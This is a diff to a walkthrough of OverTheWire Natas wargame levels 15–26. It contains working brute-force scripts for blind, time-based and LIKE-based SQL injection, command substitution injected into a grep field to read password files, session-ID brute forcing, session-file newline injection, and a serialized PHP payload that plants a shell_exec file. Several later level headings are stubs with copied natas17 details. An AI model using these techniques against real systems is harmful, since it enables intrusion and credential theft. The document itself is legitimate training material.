@@ -450,7 +450,7 @@ ___
 **URL :** <http://natas15.natas.labs.overthewire.org/> \
 **Credentials :** *natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx*
 
-Unlike the previous level, the password is no longer printed if our query returns more than 0 rows only that a user exists:
+Unlike the previous level, the password is no longer printed if our query returns more than 0 rows:
 ```php
 <?php
 
@@ -485,6 +485,16 @@ if (array_key_exists("username", $_REQUEST)) {
 }
 ?>
 ```
+Unfortunately, we also don't get given the values of any our queries, only that "This user exists" if our query returned 1 or more rows. What we can do instead is bruteforce the password for the user natas16, 1 character at a time. We know if there's a match if "This user exists" is returned. My initial approach was to use the in-built SQL LEFT() function which only compares X number of characters from the start of the string:
+```sql
+SELECT username, password FROM users WHERE username="natas16" AND LEFT(password, 1) = "a";
+```
+Unfortunately, LEFT() is case insensitive so if the password was ABC the script would match abc and move onto the next character. This is why I had to use the LIKE operator instead:
+```sql
+SELECT username, password FROM users WHERE username="natas16" AND password LIKE BINARY "a%";
+```
+
+Here is the full script I used to obtain the password:
 ```py
 import requests
 import re
@@ -510,6 +520,443 @@ while(True):
     if len(current_password) == 32:
         break
 ```
+
+This is a snapshot of what the script is doing:
+
+![Index file](/assets/images/15-1.png)
+
+```html
+hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
+```
+
+#### Natas 16 Solution
+
+___
+**URL :** <http://natas16.natas.labs.overthewire.org/> \
+**Credentials :** *natas16:hPkjKYviLQctEW33QmuXL6eDVfMW4sGo*
+
+![Index file](/assets/images/16-1.png)
+
+Recall back to level 10 when we used the following payload:
+```html
+.* /etc/natas_webpass/natas11
+```
+
+This won't work anymore due to the source code wrapping our payload in quotation marks, which means our previous payload will actually look for the pattern .* /etc/natas_webpass/natas11 inside dictionary.txt:
+```php
+<?
+$key = "";
+
+if (array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if ($key != "") {
+    if(preg_match('/[;|&`\'"]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i \"$key\" dictionary.txt");
+    }
+}
+?>
+```
+Luckily, the characters for command substitution ($) has not been whitelisted which means we can essentially run subshell. We will use a similar approach to the previous level where now we will bruteforce the password stored at /etc/natas_webpass/natas17 by checking each character 1 at a time but instead using grep:
+```bash
+grep -E "^a" /etc/natas_webpass/natas17
+```
+Unfortunately, we're not done here since although our grep command will return the password if there's a match, we won't be able to ever know if there was a match. For example, suppose the password was abc, passthru will only see:
+```bash
+passthru("grep -i \"abc\" dictionary.txt");
+```
+which will actually look for the password inside dictionary.txt (which it won't be). What we can do instead is take a word we definitely know is in dictionary.txt (eg. jump) and append it to our grep payload. This way, the passthru() command will definitely not return a match for "{password}jump" and we will know our current grep payload returned a match, and can then match the next the character. Here is the full script I used to obtain the password:
+```py
+import requests
+import re
+
+characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+
+username = "natas16"
+password = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"
+
+url = "http://natas16.natas.labs.overthewire.org"
+
+session = requests.Session()
+
+current_password = ""
+
+while(True):
+ for character in characters:
+     print("Trying with: " + current_password + character)
+     payload = "$(grep -E " + "^" + current_password + character + " /etc/natas_webpass/natas17)zigzag"
+     response = session.post(url, data={"needle": payload, "submit": "Search"}, auth=(username, password))
+     if "zigzag" not in response.text:
+      current_password += character
+      break
+      
+ if len(current_password) == 32:
+  break
+```
+This is a snapshot of what the script is doing:
+
+![Index file](/assets/images/16-2.png)
+
+```html
+EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
+```
+
+#### Natas 17 Solution
+
+___
+**URL :** <http://natas17.natas.labs.overthewire.org/> \
+**Credentials :** *natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC*
+
+This level is very similar to level 15, except now we're given no output for any of our queries.
+```php
+<?php
+
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+if (array_key_exists("username", $_REQUEST)) {
+    $link = mysqli_connect('localhost', 'natas17', '<censored>');
+    mysqli_select_db($link, 'natas17');
+
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+    if (array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    $res = mysqli_query($link, $query);
+    if ($res) {
+        if (mysqli_num_rows($res) > 0) {
+            //echo "This user exists.<br>";
+        } else {
+            //echo "This user doesn't exist.<br>";
+        }
+    } else {
+        //echo "Error in query.<br>";
+    }
+
+    mysqli_close($link);
+}
+?>
+```
+Again, it seems like a bruteforce approach would work however we need a way to know if our query returned a match. I first tried comparing the request time of queries that returned a match against ones that didn't. 
+
+![Index file](/assets/images/17-1.png)
+
+Unfortunately, the request times were too random and I couldn't find any concrete pattern. This is where the in-built SQL SLEEP() function will be very useful in creating artificial delays in the network so that I can now actually compare network request times. Adding a 2 second sleep in the database if there's a match will indicate if the current payload produced a match. Here is the full script I used to obtain the password:
+```py
+import requests
+import re
+
+characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+
+username = "natas17"
+password = "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"
+
+url = "http://natas17.natas.labs.overthewire.org"
+
+session = requests.Session()
+
+current_password = list()
+
+
+while(True):
+  for character in characters:
+    print("Trying with: " + "".join(current_password) + character)
+    payload = (
+      'natas18" AND IF('
+        'password LIKE BINARY "'
+            + "".join(current_password) + character + '%"'
+          ', SLEEP(2), 0) #'
+    )
+
+    response = session.post(url, data={"username": payload},auth=(username, password))
+    if response.elapsed.total_seconds() > 2:
+      current_password.append(character)
+      break
+  if len(current_password) == 32:
+    break
+```
+```html
+6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
+```
+
+#### Natas 18 Solution
+
+___
+**URL :** <http://natas18.natas.labs.overthewire.org/> \
+**Credentials :** *natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ*
+
+This is the source code we're given:
+```php
+<?php
+
+$maxid = 640; // 640 should be enough for everyone
+
+function isValidAdminLogin() { /* {{{ */
+    if ($_REQUEST["username"] == "admin") {
+    /* This method of authentication appears to be unsafe and has been disabled for now. */
+        //return 1;
+    }
+
+    return 0;
+}
+/* }}} */
+function isValidID($id) { /* {{{ */
+    return is_numeric($id);
+}
+/* }}} */
+function createID($user) { /* {{{ */
+    global $maxid;
+    return rand(1, $maxid);
+}
+/* }}} */
+function debug($msg) { /* {{{ */
+    if (array_key_exists("debug", $_GET)) {
+        print "DEBUG: $msg<br>";
+    }
+}
+/* }}} */
+function my_session_start() { /* {{{ */
+    if (array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
+        if (!session_start()) {
+            debug("Session start failed");
+            return false;
+        } else {
+            debug("Session start ok");
+            if(!array_key_exists("admin", $_SESSION)) {
+                debug("Session was old: admin flag set");
+                $_SESSION["admin"] = 0; // backwards compatible, secure
+            }
+            return true;
+        }
+    }
+
+    return false;
+}
+/* }}} */
+function print_credentials() { /* {{{ */
+    if ($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+        print "You are an admin. The credentials for the next level are:<br>";
+        print "<pre>Username: natas19\n";
+        print "Password: <censored></pre>";
+    } else {
+        print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
+    }
+}
+/* }}} */
+
+$showform = true;
+if (my_session_start()) {
+    print_credentials();
+    $showform = false;
+} else {
+    if (array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
+        session_id(createID($_REQUEST["username"]));
+        session_start();
+        $_SESSION["admin"] = isValidAdminLogin();
+        debug("New session started");
+        $showform = false;
+        print_credentials();
+    }
+}
+?>
+```
+
+After creating an account, I noticed were given a random PHPSESSID:
+
+![Index file](/assets/images/18-1.png)
+
+Based on the source code telling us there's only 640 ids, it seems a bruteforce approach seems likely where one of the PHPSESSID is associated with the admin account. We will try changing our PHPSESSID from 1 to 640 which the following script does:
+```py
+import requests
+import re
+
+username = "natas18"
+password = "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ"
+
+url = "http://natas18.natas.labs.overthewire.org"
+
+session = requests.Session()
+
+MAX = 640
+count = 1
+
+for i in range(MAX+1):
+  print("Trying with PHPSESSID=", i)
+  sessionID = "PHPSESSID=" + str(i)
+  headers = {"Cookie": sessionID }
+  response = session.get(url, headers=headers, auth=(username, password))
+  if "You are an admin" in response.text:
+    break
+
+```
+
+![Index file](/assets/images/18-2.png)
+
+Changing our the PHPSESSID to the one our script found and then refreshing the page gives us the password for the next level:
+
+![Index file](/assets/images/18-3.png)
+
+#### Natas 19 Solution
+
+___
+**URL :** <http://natas19.natas.labs.overthewire.org/> \
+**Credentials :** *natas19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr*
+
+Unlike the previous level, we are told session ids are no longer sequential:
+
+![Index file](/assets/images/19-1.png)
+
+![Index file](/assets/images/19-2.png)
+
+Some of the characters looked like ASCII characters so I put it into a decoder:
+
+![Index file](/assets/images/19-3.png)
+
+After deleting the id, creating an account with the same name, and then decoding, I started to notice a pattern:
+
+![Index file](/assets/images/19-4.png)
+
+It looks like the id is being generated by prepending a number before the username it is given and then it gets encoded. I decided to write another bruteforce script that cycles through 1-admin to 640-admin to hopefully gain access to admin session:
+```py
+import requests
+
+username = "natas19"
+password = "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr"
+
+url = "http://natas19.natas.labs.overthewire.org"
+
+session = requests.Session()
+
+MAX = 640
+count = 1
+
+for i in range(MAX+1):
+  payload = f"{i}-admin".encode().hex()
+  print("Trying with PHPSESSID=", payload)
+  sessionID = "PHPSESSID=" + payload
+  headers = {"Cookie": sessionID }
+  response = session.get(url, headers=headers, auth=(username, password))
+  if "You are an admin" in response.text:
+    break
+```
+
+![Index file](/assets/images/19-5.png)
+
+Again, changing our PHPSESSID to the one our script find produces the password:
+
+![Index file](/assets/images/19-6.png)
+
+#### Natas 20 Solution
+
+___
+**URL :** <http://natas20.natas.labs.overthewire.org/> \
+**Credentials :** *natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw*
+
+Unike the previous 2 levels, modifying PHPSESSID doesn't seem viable since it looks like a randomly generated string. We're also given new source code:
+
+```php
+function print_credentials() { /* {{{ */
+    if ($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas21\n";
+    print "Password: <censored></pre>";
+    } else {
+    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
+    }
+}
+
+function myread($sid) {
+    debug("MYREAD $sid");
+    if (strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
+    debug("Invalid SID");
+        return "";
+    }
+    $filename = session_save_path() . "/" . "mysess_" . $sid;
+    if (!file_exists($filename)) {
+        debug("Session file doesn't exist");
+        return "";
+    }
+    debug("Reading from ". $filename);
+    $data = file_get_contents($filename);
+    $_SESSION = array();
+    foreach(explode("\n", $data) as $line) {
+        debug("Read [$line]");
+        $parts = explode(" ", $line, 2);
+        if ($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
+    }
+    return session_encode() ?: "";
+}
+
+function mywrite($sid, $data) {
+    // $data contains the serialized version of $_SESSION
+    // but our encoding is better
+    debug("MYWRITE $sid $data");
+    // make sure the sid is alnum only!!
+    if (strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
+    debug("Invalid SID");
+        return;
+    }
+    $filename = session_save_path() . "/" . "mysess_" . $sid;
+    $data = "";
+    debug("Saving in ". $filename);
+    ksort($_SESSION);
+    foreach($_SESSION as $key => $value) {
+        debug("$key => $value");
+        $data .= "$key $value\n";
+    }
+    file_put_contents($filename, $data);
+    chmod($filename, 0600);
+    return true;
+}
+
+if (array_key_exists("name", $_REQUEST)) {
+    $_SESSION["name"] = $_REQUEST["name"];
+    debug("Name set to " . $_REQUEST["name"]);
+}
+```
+
+It appears our session id derives its encoding from the contents of a file. It also writes whatever we pass in as our username to a file, which is later read from. This part of the code is particularly interesting:
+```php
+    foreach(explode("\n", $data) as $line) {
+        debug("Read [$line]");
+        $parts = explode(" ", $line, 2);
+        if ($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
+    }
+```
+It looks like the keys for $_SESSION is obtained from the first word on each line. If we also look at the condition for print_credentials:
+```html
+$_SESSION["admin"] == 1
+```
+all we need is a way to put "admin 1" on its own line in the file the server reads and writes to. Luckily we do have a way through the username field which is written to the file! A payload like the following would work:
+```html
+Kim\nadmin 1
+```
+We will use curl to make the request and send raw bytes since the browser for some reason treats newlines as a space. Our first request will create the user:
+```bash
+curl -s -c sess.txt -u natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw -d "name=wee%0Aadmin 1" http://natas20.natas.labs.overthewire.org/index.php
+```
+The second request will retrieve the password:
+```bash
+curl -s -b sess.txt -u natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw http://natas20.natas.labs.overthewire.org/index.php
+```
+```html
+You are an admin. The credentials for the next level are:<br><pre>Username: natas21
+Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
+```
+#### Natas 21 Solution
+
+___
+**URL :** <http://natas17.natas.labs.overthewire.org/> \
+**Credentials :** *natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC*
+
 
 #### Natas 22 Solution
 
@@ -558,3 +1005,33 @@ Had to search up what strstr did
 Tried xxiloveyouxx
 Assumed the input had to be > 10 characters in length
 15iloveyou
+
+
+#### Natas 24 Solution
+
+___
+**URL :** <http://natas17.natas.labs.overthewire.org/> \
+**Credentials :** *natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC*
+
+#### Natas 25 Solution
+
+___
+**URL :** <http://natas17.natas.labs.overthewire.org/> \
+**Credentials :** *natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC*
+
+
+#### Natas 26 Solution
+```php
+class Logger{
+    private $logFile;
+    private $exitMsg;
+
+    function __construct(){
+        $this->exitMsg= "<?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?>";
+        $this->logFile = "/var/www/natas/natas26/img/natas26_v7r8ankdhkfvuo3jtpe6pe7dnu.php";
+    }
+}
+
+$logger = new Logger();
+echo base64_encode(serialize($logger));
+```
